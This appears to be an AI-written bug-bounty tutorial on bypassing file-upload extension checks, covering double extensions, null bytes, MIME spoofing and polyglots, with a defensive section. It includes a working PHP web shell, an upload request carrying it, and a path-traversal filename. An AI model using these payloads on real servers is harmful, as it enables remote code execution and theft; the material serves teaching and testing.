![a](https://github.com/user-attachments/assets/9d4895ad-c6e9-46ae-a5b3-4de9c5169c05)

## 1. The Core Concept

When a web application allows users to upload files (e.g., profile pictures, documents, attachments), it often tries to **restrict what file types can be uploaded**.
For example:

* Only allowing `.jpg`, `.png`, `.gif` images.
* Blocking dangerous file types like `.php`, `.asp`, `.jsp` that can execute code on the server.

However, if the validation is weak or poorly implemented, attackers can **bypass these restrictions** and upload malicious files (like a web shell), gaining control of the server.

---

## 2. Why File Extension Validation Fails

Applications often make mistakes in how they check file extensions:

* **Client-side validation**: Checking only in JavaScript (can be bypassed easily by modifying requests).
* **Weak blacklist**: Blocking only `.php` but not `.php5`, `.phtml`, or `.phar`.
* **Trusting MIME type**: Attackers can modify HTTP request headers to fake the MIME type.
* **Not sanitizing file names**: Uploading `shell.php.jpg` might still be treated as PHP if the server parses the last extension incorrectly.

---

## 3. Common Bypass Techniques (with Examples)

### 3.1 Double Extension Trick

Attackers add **two extensions** to the file name.
Example:

```
shell.php.jpg
```

If the application only checks for `.jpg`, it passes validation.
But on the server (especially in Apache with old configs), `.php` might still be executed as PHP.

### 3.2 Case Manipulation

File extensions are case-insensitive in many systems.
Example:

```
shell.PhP
shell.PHP5
```

If the filter only blocks `.php`, these might bypass.

### 3.3 Null Byte Injection

In older PHP and some misconfigured systems, a **null byte (%00)** can terminate the string.
Example:

```
shell.php%00.jpg
```

The application thinks it’s `.jpg`, but the server interprets it as `.php`.

### 3.4 Trailing Characters

Adding extra characters after the extension.
Example:

```
shell.php.
shell.php..jpg
```

On Windows/IIS, `shell.php.` may still execute as PHP.

### 3.5 Overlooked Extensions

Web servers support multiple valid extensions for the same language.
Examples:

* PHP: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`
* ASP: `.asp`, `.aspx`
* JSP: `.jsp`, `.jspx`

So if the filter only blocks `.php`, an attacker can try:

```
shell.phtml
shell.phar
```

### 3.6 Uploading in Unrestricted Locations

Sometimes the app allows the attacker to control the **upload path**.
Example:

```
../../../var/www/html/shell.php
```

This is a **path traversal attack** that places the file in a web-accessible directory.

### 3.7 MIME Type Spoofing

The application checks the file’s **MIME type** (e.g., `image/jpeg`), but this can be faked.
Example Burp Suite request:

```
POST /upload
Content-Type: multipart/form-data; boundary=12345

--12345
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
--12345--
```

Here, the file is actually PHP, but the `Content-Type: image/jpeg` fools weak validation.

### 3.8 Polyglot Files

A **polyglot file** is both a valid image **and** executable code.
For example, a PHP payload can be hidden inside the metadata of a JPEG file:

```
<?php system($_GET['cmd']); ?>
```

If the server executes the `.php` part, the attacker gets code execution.

---

## 4. Realistic Example: Uploading a PHP Web Shell

Let’s say the target app only allows `.jpg` files.

### Step 1: Prepare a malicious PHP web shell

```php
<?php
  if(isset($_GET['cmd'])){
    system($_GET['cmd']);
  }
?>
```

### Step 2: Save it as `shell.php.jpg`

* App checks `.jpg` and approves.
* Server interprets `.php` and executes.

### Step 3: Access the shell

```
http://target.com/uploads/shell.php.jpg?cmd=whoami
```

Output:

```
www-data
```

The attacker now has remote code execution.

---

## 5. Impact of Successful Bypass

If an attacker manages to upload and execute a malicious file:

* **Remote Code Execution (RCE):** Full control of the server.
* **Privilege Escalation:** Gain higher system privileges.
* **Data Theft:** Access databases, config files, user credentials.
* **Website Defacement:** Replace content or inject backdoors.
* **Lateral Movement:** Pivot inside the internal network.

---

## 6. Defense and Mitigation

### 6.1 Secure File Validation

* Use a **whitelist** of allowed extensions (e.g., only `.jpg`, `.png`).
* Verify **MIME type** server-side with libraries, not just headers.
* Perform **magic number checks** (inspect file headers, not names).

### 6.2 Store Files Safely

* Store uploads **outside webroot** (not directly accessible via URL).
* Rename files to random hashes (e.g., `abc123.jpg`).
* Restrict file permissions (never executable).

### 6.3 Use Security Layers

* Apply **Content Security Policy (CSP)**.
* Run uploads through **antivirus/malware scanners**.
* Keep server configurations updated to avoid legacy behavior.

### 6.4 Example of Safe Upload Handling in PHP

```php
$allowed_extensions = ['jpg','png','gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($ext, $allowed_extensions)) {
    die("Invalid file type");
}

$check = getimagesize($_FILES['file']['tmp_name']);
if ($check === false) {
    die("File is not a valid image");
}

move_uploaded_file($_FILES['file']['tmp_name'], "/var/www/uploads/" . uniqid() . "." . $ext);
```

---

## 7. Checklist 

When testing a file upload feature, always try:

* [ ] Double extensions (`file.php.jpg`)
* [ ] Case variations (`file.PhP`)
* [ ] Null bytes (`file.php%00.jpg`)
* [ ] Trailing dots (`file.php.`)
* [ ] Alternate extensions (`file.phtml`, `file.phar`)
* [ ] Path traversal (`../../../shell.php`)
* [ ] MIME spoofing (`Content-Type: image/jpeg`)
* [ ] Polyglot files (`valid image + PHP code`)



Do you want me to also expand this into a **GitHub-ready Markdown template** (Overview, Exploitation, Impact, Checklist) so you can directly use it for your bug bounty notes?
